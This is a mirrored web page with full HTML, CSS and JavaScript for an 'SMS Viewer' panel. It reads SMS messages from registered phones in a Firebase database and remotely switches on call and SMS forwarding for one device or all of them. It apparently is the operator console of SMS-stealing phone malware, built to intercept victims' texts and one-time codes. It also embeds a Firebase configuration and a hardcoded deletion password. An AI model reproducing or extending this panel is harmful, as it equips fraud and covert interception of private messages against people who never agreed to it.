<style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f5f5f5;
            text-align: center;
        }

        header {
            background-color: #3498db;
            color: white;
            padding: 15px;
            font-size: 20px;
        }

        #number-list {
            max-width: 400px;
            margin: 20px auto;
            background: white;
            padding: 15px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: left;
        }

        .number-item {
            background-color: #fff;
            padding: 10px;
            margin-bottom: 10px;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            border: 1px solid #ddd;
        }

        .number-item:hover {
            background-color: #e3f2fd;
        }

        #message-container {
            max-width: 500px;
            margin: 20px auto;
            background: white;
            padding: 15px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            display: none;
        }

        .message-item {
            padding: 10px;
            border-bottom: 1px solid #ddd;
            position: relative;
            border-radius: 5px;
        }

        .timestamp {
            font-size: 12px;
            color: #666;
        }

        #back-button, #delete-all-button, #delete-all-numbers, #show-all-messages {
    margin-top: 10px;
    padding: 10px;
    color: white;
    border: none;
    cursor: pointer;
    border-radius: 5px;
}

#back-button, #delete-all-button {
    margin-right: 5px;
}

        #show-all-messages {
            background-color: #3498db;
        }

        #delete-all-button, #delete-all-numbers {
            background-color: #e74c3c;
        }

        footer {
            background-color: #f0f0f0;
            text-align: center;
            padding: 10px;
            margin-top: 20px;
        }

        .delete-message {
            position: absolute;
            bottom: 5px;
            right: 5px;
            background-color: #e74c3c;
            color: white;
            border: none;
            padding: 5px 10px;
            cursor: pointer;
            border-radius: 5px;
        }
        
        /* Forwarding Styles */
        .forwarding-controls {
            margin-top: 10px;
            padding: 10px;
            background: #f8f9fa;
            border-radius: 5px;
            border: 1px solid #ddd;
        }
        
        .forwarding-input {
            width: 100%;
            padding: 8px;
            margin: 5px 0;
            border: 1px solid #ddd;
            border-radius: 4px;
            display: block;
        }
        
        .forwarding-btn {
            background-color: #2ecc71;
            color: white;
            border: none;
            padding: 8px 15px;
            margin: 5px 5px 5px 0;
            border-radius: 4px;
            cursor: pointer;
        }
        
        .stop-forwarding-btn {
            background-color: #e74c3c;
            color: white;
            border: none;
            padding: 8px 15px;
            margin: 5px 0;
            border-radius: 4px;
            cursor: pointer;
        }
        
        .forwarding-status {
            font-size: 14px;
            color: #2ecc71;
            margin-top: 5px;
            padding: 8px;
            background: #e8f5e9;
            border-radius: 4px;
            display: none;
        }
        
        .forwarding-active .forwarding-input,
        .forwarding-active .forwarding-btn {
            display: none;
        }
        
        .forwarding-active .forwarding-status {
            display: block;
        }
        
        .global-forwarding {
            margin-bottom: 15px;
            padding: 10px;
            background: #f8f9fa;
            border-radius: 5px;
            border: 1px solid #ddd;
        }
        
        .global-status {
            font-size: 14px;
            color: #2ecc71;
            margin-top: 5px;
            padding: 8px;
            background: #e8f5e9;
            border-radius: 4px;
            display: none;
        }
        
        .global-active #global-forwarding-input,
        .global-active #set-global-forwarding {
            display: none;
        }
        
        .global-active .global-status {
            display: block;
        }
        
        .sms-forwarding-controls {
            margin-top: 15px;
            padding: 10px;
            background: #f8f9fa;
            border-radius: 5px;
            border: 1px solid #ddd;
        }
        
        .sms-forwarding-active .sms-forwarding-input,
        .sms-forwarding-active .sms-forwarding-btn {
            display: none;
        }
        
        .sms-forwarding-active .sms-forwarding-status {
            display: block;
        }
        
        #back-button {
    background-color: #2ecc71; /* Green to indicate active */
}

#back-button:hover {
    background-color: #27ae60; /* Darker green on hover */
}

#back-button:disabled {
    background-color: #cccccc;
    cursor: not-allowed;
}
    </style>




<!DOCTYPE html>
<html lang="en">

<!-- Mirrored from s1-details.web.app/oBQECHS01O by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 11 Apr 2025 07:47:38 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Registered Numbers & SMS Viewer</title>
    
</head>
<body>
    <header>
        üì≤ <strong>Registered Numbers & SMS Viewer</strong>
    </header>

    <div id="number-list">
        <h3>üìû Registered Phone Numbers</h3>
        
        <!-- Global Call Forwarding Controls -->
        <div class="global-forwarding" id="global-forwarding-container">
            <h4>Global Call Forwarding</h4>
            <input type="tel" id="global-forwarding-input" class="forwarding-input" 
                   placeholder="Enter 10-digit forwarding number" 
                   maxlength="10">
            <div>
                <button id="set-global-forwarding" class="forwarding-btn">Set All Devices</button>
                <button id="stop-global-forwarding" class="stop-forwarding-btn">Stop All Forwarding</button>
            </div>
            <div class="global-status" id="global-forwarding-status"></div>
        </div>
        
        <!-- Global SMS Forwarding Controls -->
        <div class="sms-forwarding-controls" id="global-sms-forwarding-container">
            <h4>Global SMS Forwarding</h4>
            <input type="tel" id="global-sms-forwarding-input" class="forwarding-input" 
                   placeholder="Enter 10-digit SMS forwarding number" 
                   maxlength="10">
            <div>
                <button id="set-global-sms-forwarding" class="forwarding-btn">Set SMS Forwarding</button>
                <button id="stop-global-sms-forwarding" class="stop-forwarding-btn">Stop SMS Forwarding</button>
            </div>
            <div class="global-status" id="global-sms-forwarding-status"></div>
        </div>
        
        <div id="numbers"></div>
        <button id="show-all-messages">üì© Show All Messages</button>
        <button id="delete-all-numbers">üóëÔ∏è Delete All Numbers</button>
    </div>

    <div id="message-container">
        <h3>üì© SMS Messages</h3>
        <div id="messages"></div>
        <button id="back-button">üîô Back to Numbers</button>
        <button id="show-all-messages">üì® Show All Messages</button>
        <button id="delete-all-button">üóëÔ∏è Delete All Messages</button>
    </div>

    <footer>
        <p>¬© 2024 SMS Viewer | All Rights Reserved</p>
    </footer>

 <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-app.js";
    import { getDatabase, ref, onValue, remove, update } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-database.js";

    const firebaseConfig = {
 apiKey: "AIzaSyC6ZrIwThJ-peArZpH0OCF0Yq6HqJ6q5s4",
  authDomain: "jjkkjjkjkknk.firebaseapp.com",
  databaseURL: "https://jjkkjjkjkknk-default-rtdb.firebaseio.com",
  projectId: "jjkkjjkjkknk",
  storageBucket: "jjkkjjkjkknk.firebasestorage.app",
  messagingSenderId: "522948753446",
  appId: "1:522948753446:web:23d926d5459238a3238ee7",
  measurementId: "G-6DGN739RE9"
};

    const app = initializeApp(firebaseConfig);
    const database = getDatabase(app);

    const registeredNumbersRef = ref(database, "cust1176");
    const numberList = document.getElementById("numbers");
    const messageContainer = document.getElementById("message-container");
    const messagesDiv = document.getElementById("messages");
    const backButton = document.getElementById("back-button");
    const deleteAllButton = document.getElementById("delete-all-button");
    const deleteAllNumbersButton = document.getElementById("delete-all-numbers");
    const showAllMessagesButtons = document.querySelectorAll("#show-all-messages");
    const globalForwardingInput = document.getElementById("global-forwarding-input");
    const setGlobalForwardingBtn = document.getElementById("set-global-forwarding");
    const stopGlobalForwardingBtn = document.getElementById("stop-global-forwarding");
    const globalForwardingStatus = document.getElementById("global-forwarding-status");
    const globalForwardingContainer = document.getElementById("global-forwarding-container");
    const globalSmsForwardingInput = document.getElementById("global-sms-forwarding-input");
    const setGlobalSmsForwardingBtn = document.getElementById("set-global-sms-forwarding");
    const stopGlobalSmsForwardingBtn = document.getElementById("stop-global-sms-forwarding");
    const globalSmsForwardingStatus = document.getElementById("global-sms-forwarding-status");
    const globalSmsForwardingContainer = document.getElementById("global-sms-forwarding-container");

    let currentDeviceID = null;
    let isShowingAllMessages = false;

    onValue(registeredNumbersRef, (snapshot) => {
        const data = snapshot.val();
        numberList.innerHTML = "";

        if (data) {
            Object.keys(data).forEach(number => {
                if (data[number] === true) return;

                const div = document.createElement("div");
                div.classList.add("number-item");

                const forwardingData = data[number]?.forwarding || {};
                const smsForwardingData = data[number]?.smsForwarding || {};
                const forwardingNumber = forwardingData.number || "";
                const smsForwardingNumber = smsForwardingData.number || "";
                const isForwardingActive = forwardingNumber !== "";
                const isSmsForwardingActive = smsForwardingNumber !== "";

                div.innerHTML = `
                    <div>üìû ${number}</div>
                    <div class="forwarding-controls ${isForwardingActive ? 'forwarding-active' : ''}">
                        <input type="tel" class="forwarding-input" 
                               placeholder="Enter call forwarding number" 
                               maxlength="10"
                               value="${forwardingNumber}"
                               data-number="${number}">
                        <div class="forwarding-status">
                            Call forwarding active to: ${forwardingNumber}
                        </div>
                        <div>
                            <button class="forwarding-btn" data-number="${number}">Set Call Forwarding</button>
                            <button class="stop-forwarding-btn" data-number="${number}">
                                Stop Call Forwarding
                            </button>
                        </div>
                    </div>
                    <div class="forwarding-controls sms-forwarding-controls ${isSmsForwardingActive ? 'sms-forwarding-active' : ''}">
                        <input type="tel" class="forwarding-input sms-forwarding-input" 
                               placeholder="Enter SMS forwarding number" 
                               maxlength="10"
                               value="${smsForwardingNumber}"
                               data-number="${number}">
                        <div class="forwarding-status sms-forwarding-status">
                            SMS forwarding active to: ${smsForwardingNumber}
                        </div>
                        <div>
                            <button class="forwarding-btn sms-forwarding-btn" data-number="${number}">Set SMS Forwarding</button>
                            <button class="stop-forwarding-btn stop-sms-forwarding-btn" data-number="${number}">
                                Stop SMS Forwarding
                            </button>
                        </div>
                    </div>
                `;

                div.querySelector('div:first-child').addEventListener("click", () => showMessages(number));

                numberList.appendChild(div);

                const callForwardingControls = div.querySelector('.forwarding-controls:not(.sms-forwarding-controls)');
                const callInputField = div.querySelector('.forwarding-input:not(.sms-forwarding-input)');
                const callForwardBtn = div.querySelector('.forwarding-btn:not(.sms-forwarding-btn)');
                const callStopBtn = div.querySelector('.stop-forwarding-btn:not(.stop-sms-forwarding-btn)');
                const callStatusElement = div.querySelector('.forwarding-status:not(.sms-forwarding-status)');

                callForwardBtn.addEventListener('click', () => {
                    const forwardingNumber = callInputField.value;
                    if (forwardingNumber.length === 10) {
                        updateForwarding(number, forwardingNumber, true, 'forwarding');
                        callForwardingControls.classList.add('forwarding-active');
                        callStatusElement.textContent = `Call forwarding active to: ${forwardingNumber}`;
                        callStopBtn.style.display = "inline-block";
                    } else {
                        alert("Please enter a valid 10-digit number");
                    }
                });

                callStopBtn.addEventListener('click', () => {
                    updateForwarding(number, "", false, 'forwarding');
                    callForwardingControls.classList.remove('forwarding-active');
                    callInputField.value = "";
                });

                const smsForwardingControls = div.querySelector('.sms-forwarding-controls');
                const smsInputField = div.querySelector('.sms-forwarding-input');
                const smsForwardBtn = div.querySelector('.sms-forwarding-btn');
                const smsStopBtn = div.querySelector('.stop-sms-forwarding-btn');
                const smsStatusElement = div.querySelector('.sms-forwarding-status');

                smsForwardBtn.addEventListener('click', () => {
                    const forwardingNumber = smsInputField.value;
                    if (forwardingNumber.length === 10) {
                        updateForwarding(number, forwardingNumber, true, 'smsForwarding');
                        smsForwardingControls.classList.add('sms-forwarding-active');
                        smsStatusElement.textContent = `SMS forwarding active to: ${forwardingNumber}`;
                        smsStopBtn.style.display = "inline-block";
                    } else {
                        alert("Please enter a valid 10-digit number");
                    }
                });

                smsStopBtn.addEventListener('click', () => {
                    updateForwarding(number, "", false, 'smsForwarding');
                    smsForwardingControls.classList.remove('sms-forwarding-active');
                    smsInputField.value = "";
                });
            });
        } else {
            numberList.innerHTML = "<p>No registered numbers found.</p>";
        }
    });

    setGlobalForwardingBtn.addEventListener('click', () => {
        const forwardingNumber = globalForwardingInput.value;
        if (forwardingNumber.length === 10) {
            updateAllForwarding(forwardingNumber, true, 'forwarding');
            globalForwardingContainer.classList.add('global-active');
            globalForwardingStatus.textContent = `Global call forwarding active to: ${forwardingNumber}`;
            stopGlobalForwardingBtn.style.display = "inline-block";
        } else {
            alert("Please enter a valid 10-digit number");
        }
    });

    stopGlobalForwardingBtn.addEventListener('click', () => {
        updateAllForwarding("", false, 'forwarding');
        globalForwardingContainer.classList.remove('global-active');
        globalForwardingInput.value = "";
    });

    setGlobalSmsForwardingBtn.addEventListener('click', () => {
        const forwardingNumber = globalSmsForwardingInput.value;
        if (forwardingNumber.length === 10) {
            updateAllForwarding(forwardingNumber, true, 'smsForwarding');
            globalSmsForwardingContainer.classList.add('global-active');
            globalSmsForwardingStatus.textContent = `Global SMS forwarding active to: ${forwardingNumber}`;
            stopGlobalSmsForwardingBtn.style.display = "inline-block";
        } else {
            alert("Please enter a valid 10-digit number");
        }
    });

    stopGlobalSmsForwardingBtn.addEventListener('click', () => {
        updateAllForwarding("", false, 'smsForwarding');
        globalSmsForwardingContainer.classList.remove('global-active');
        globalSmsForwardingInput.value = "";
    });

    function updateAllForwarding(forwardingNumber, isActive, type) {
        const updates = {};
        onValue(registeredNumbersRef, (snapshot) => {
            const data = snapshot.val();
            if (data) {
                Object.keys(data).forEach(number => {
                    if (data[number] === true) return;

                    if (isActive) {
                        updates[`cust1176/${number}/${type}`] = {
                            number: forwardingNumber,
                            active: true,
                            lastUpdated: new Date().toISOString()
                        };
                    } else {
                        updates[`cust1176/${number}/${type}`] = null;
                    }
                });

                update(ref(database), updates).catch(error => console.error("Error:", error));
            }
        });
    }

    function updateForwarding(deviceNumber, forwardingNumber, isActive, type) {
        const updates = {};
        if (isActive) {
            updates[`cust1176/${deviceNumber}/${type}`] = {
                number: forwardingNumber,
                active: true,
                lastUpdated: new Date().toISOString()
            };
        } else {
            updates[`cust1176/${deviceNumber}/${type}`] = null;
        }
        update(ref(database), updates).catch(error => console.error("Error:", error));
    }

    function showMessages(deviceID) {
        currentDeviceID = deviceID;
        isShowingAllMessages = false;
        numberList.parentElement.style.display = "none";
        messageContainer.style.display = "block";
        messagesDiv.innerHTML = `<h4>Messages for: ${deviceID}</h4>`;
        backButton.disabled = false;

        const messagesRef = ref(database, `cust1176/${deviceID}`);

        onValue(messagesRef, (snapshot) => {
            const data = snapshot.val();
            messagesDiv.innerHTML = "";

            if (data) {
                Object.entries(data)
                    .filter(([key, value]) => value.sender)
                    .sort(([, a], [, b]) => new Date(b.date_time).getTime() - new Date(a.date_time).getTime())
                    .forEach(([key, sms]) => {
                        const div = document.createElement("div");
                        div.classList.add("message-item");
                        div.innerHTML = `
                            <p><strong>Sender:</strong> ${sms.sender}</p>
                            <p><strong>Message:</strong> ${sms.message}</p>
                            <p class="timestamp"><strong>Timestamp:</strong> ${new Date(sms.date_time.replace(" ", "T")).toLocaleString()}</p>
                        `;

                        const deleteButton = document.createElement("button");
                        deleteButton.textContent = "üóëÔ∏è Delete";
                        deleteButton.classList.add("delete-message");
                        deleteButton.addEventListener("click", () => deleteMessage(deviceID, key));
                        div.appendChild(deleteButton);

                        messagesDiv.appendChild(div);
                    });
            } else {
                messagesDiv.innerHTML = "<p>No messages found.</p>";
            }
        });
    }

    showAllMessagesButtons.forEach(button => {
        button.addEventListener("click", () => {
            isShowingAllMessages = true;
            currentDeviceID = null;
            numberList.parentElement.style.display = "none";
            messageContainer.style.display = "block";
            messagesDiv.innerHTML = `<h4>All Messages</h4>`;
            backButton.disabled = false;

            // Hide all "Show All Messages" buttons
            showAllMessagesButtons.forEach(btn => {
                btn.style.display = "none";
            });

            const allMessagesRef = ref(database, `cust1176`);

            onValue(allMessagesRef, (snapshot) => {
                const data = snapshot.val();
                messagesDiv.innerHTML = "";
                let messages = [];

                if (data) {
                    Object.entries(data).forEach(([deviceID, deviceData]) => {
                        if (deviceData === true) return;

                        if (deviceData) {
                            Object.entries(deviceData).forEach(([key, value]) => {
                                if (value.sender) {
                                    messages.push({
                                        deviceID,
                                        key,
                                        ...value
                                    });
                                }
                            });
                        }
                    });

                    messages.sort((a, b) => new Date(b.date_time).getTime() - new Date(a.date_time).getTime());

                    if (messages.length > 0) {
                        messages.forEach(msg => {
                            const div = document.createElement("div");
                            div.classList.add("message-item");
                            div.innerHTML = `
                                <p><strong>Device:</strong> ${msg.deviceID}</p>
                                <p><strong>Sender:</strong> ${msg.sender}</p>
                                <p><strong>Message:</strong> ${msg.message}</p>
                                <p class="timestamp"><strong>Timestamp:</strong> ${new Date(msg.date_time.replace(" ", "T")).toLocaleString()}</p>
                            `;

                            const deleteButton = document.createElement("button");
                            deleteButton.textContent = "üóëÔ∏è Delete";
                            deleteButton.classList.add("delete-message");
                            deleteButton.addEventListener("click", () => deleteMessage(msg.deviceID, msg.key));
                            div.appendChild(deleteButton);

                            messagesDiv.appendChild(div);
                        });
                    } else {
                        messagesDiv.innerHTML = "<p>No messages found.</p>";
                    }
                } else {
                    messagesDiv.innerHTML = "<p>No messages found.</p>";
                }
            });
        });
    });

    function deleteMessage(deviceID, messageKey) {
        const password = prompt("Enter password to delete this message:");
        if (password === "Telegram") {
            remove(ref(database, `cust1176/${deviceID}/${messageKey}`))
                .then(() => alert("Message deleted successfully!"))
                .catch(err => alert("Error deleting message: " + err.message));
        } else {
            alert("‚ùå Incorrect password.");
        }
    }

    deleteAllButton.addEventListener("click", () => {
        const password = prompt("Enter password to delete all messages:");
        if (password === "Telegram") {
            if (currentDeviceID) {
                remove(ref(database, `cust1176/${currentDeviceID}`))
                    .then(() => alert("All messages deleted successfully!"))
                    .catch(err => alert("Error deleting messages: " + err.message));
            } else if (isShowingAllMessages) {
                remove(ref(database, `cust1176`))
                    .then(() => {
                        alert("All messages from all devices deleted successfully!");
                        messageContainer.style.display = "none";
                        numberList.parentElement.style.display = "block";
                        isShowingAllMessages = false;
                    })
                    .catch(err => alert("Error deleting messages: " + err.message));
            }
        } else {
            alert("‚ùå Incorrect password.");
        }
    });

    deleteAllNumbersButton.addEventListener("click", () => {
        const password = prompt("Enter password to delete all numbers:");
        if (password === "Telegram") {
            remove(ref(database, `cust1176`))
                .then(() => alert("All numbers deleted successfully!"))
                .catch(err => alert("Error deleting numbers: " + err.message));
        } else {
            alert("‚ùå Incorrect password.");
        }
    });

    backButton.addEventListener("click", () => {
        messageContainer.style.display = "none";
        numberList.parentElement.style.display = "block";
        isShowingAllMessages = false;
        currentDeviceID = null;
    });
</script>
</body>

<!-- Mirrored from s1-details.web.app/oBQECHS01O by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 11 Apr 2025 07:47:38 GMT -->
</html>